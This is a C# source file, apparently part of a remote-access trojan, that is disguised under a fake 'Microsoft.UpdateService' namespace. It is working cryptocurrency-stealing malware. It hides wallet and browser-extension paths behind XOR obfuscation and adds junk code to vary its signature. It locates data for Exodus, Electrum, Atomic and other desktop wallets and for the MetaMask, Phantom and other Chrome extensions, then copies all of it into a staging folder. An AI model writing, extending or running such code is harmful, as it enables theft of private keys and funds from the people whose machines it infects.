using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace Microsoft.UpdateService.Modules
{
    public class CryptoService
    {
        // [POLY_JUNK]
        private static void _DuckDuckRat_00d4870f() {
            int val = 52862;
            if (val > 50000) Console.WriteLine("Hash:" + 52862);
        }

        private static string D(string s)
        {
            char[] c = s.ToCharArray();
            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ 0x05);
            return new string(c);
        }

        private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        private readonly Dictionary<string, string> _walletPaths = new Dictionary<string, string>
        {
            {"Exodus", D("@}japvYY`}japv+rdii`q")},
            {"Electrum", D("@i`fqwphYYrdii`qv")},
            {"Coinomi", D("FjlkjhlYYFjlkjhlYYrdii`qv")},
            {"Atomic", D("dqjhlfYYIjfdi%Vqjwdb`YYi`s`iag")},
            {"Guarda", D("BpdwadYYIjfdi%Vqjwdb`YYi`s`iag")},
            {"Jaxx", D("fjh+ilg`wq|+od}}YYLka`}`aAGYYcli`ZZ5+lka`}`aag+i`s`iag")}
        };

        private readonly Dictionary<string, string> _extensionPaths = new Dictionary<string, string>
        {
            {"Metamask", D("knglmcg`jbd`dj`mi`cknjag`cbubnkk")},
            {"Phantom", D("gckdjjh`nm`mag`umkohhfuqjggljb``")},
            {"Binance", D("cmgjmmilajfgdf`ajmjmoff`kkjjjfdd")},
            {"Coinbase", D("mkcdknkjfc`jcgaabflokhmkcknakjda")},
            {"Trust Wallet", D("`bolaogubhfklmnh|mbk`md%glauhjda")}
        };

        public async Task<string> Run(string outputDir)
        {
            string destPath = Path.Combine(outputDir, "Wallets");
            Directory.CreateDirectory(destPath);

            int count = 0;

            // 1. Software Wallets
            foreach (var wallet in _walletPaths)
            {
                string fullPath = Path.Combine(_appData, wallet.Value);
                if (Directory.Exists(fullPath) || File.Exists(fullPath))
                {
                    string target = Path.Combine(destPath, wallet.Key);
                    if (File.Exists(fullPath))
                    {
                        Directory.CreateDirectory(Path.GetDirectoryName(target));
                        File.Copy(fullPath, target, true);
                    }
                    else 
                    {
                        CopyDirectory(fullPath, target);
                    }
                    count++;
                }
            }

            // 2. Browser Extensions (Chrome Example)
            string chromeExtPath = Path.Combine(_localAppData, D("Bjjbi`YFmwjh`YPv`w%AdqdYA`idpiqYIjfdi%@}q`kvljk%V`qqmkgv"));
            if (Directory.Exists(chromeExtPath))
            {
                foreach (var ext in _extensionPaths)
                {
                    string fullPath = Path.Combine(chromeExtPath, ext.Value);
                    if (Directory.Exists(fullPath))
                    {
                        CopyDirectory(fullPath, Path.Combine(destPath, "Extensions", ext.Key));
                        count++;
                    }
                }
            }

            return count > 0 ? $"✅ Found {count} crypto-related items." : "❌ No wallets found.";
        }

        private void CopyDirectory(string sourceDir, string destDir)
        {
            Directory.CreateDirectory(destDir);
            foreach (var file in Directory.GetFiles(sourceDir))
            {
                File.Copy(file, Path.Combine(destDir, Path.GetFileName(file)), true);
            }
            foreach (var subDir in Directory.GetDirectories(sourceDir))
            {
                CopyDirectory(subDir, Path.Combine(destDir, Path.GetFileName(subDir)));
            }
        }
    }
}


